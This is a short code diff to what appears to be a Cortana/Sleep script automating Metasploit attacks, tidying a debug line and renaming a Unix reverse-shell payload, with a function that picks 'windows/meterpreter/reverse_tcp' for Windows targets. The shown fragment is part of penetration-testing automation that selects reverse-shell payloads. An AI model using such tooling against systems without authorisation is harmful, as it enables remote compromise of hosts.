@@ -1,9 +1,3 @@
-debug(7);
-
-on ready {
-   #fire_event_local("sessionHandle");
-}
-
 command arguments {
    local('$counter @attacks');
 
@@ -94,7 +88,7 @@ sub determinePayload {
    if ($1 == "windows") {
       return "windows/meterpreter/reverse_tcp";
    }
-   return "payload/cmd/unix/reverse";
+   return "cmd/unix/reverse";
 }
 
 on sessionHandle {
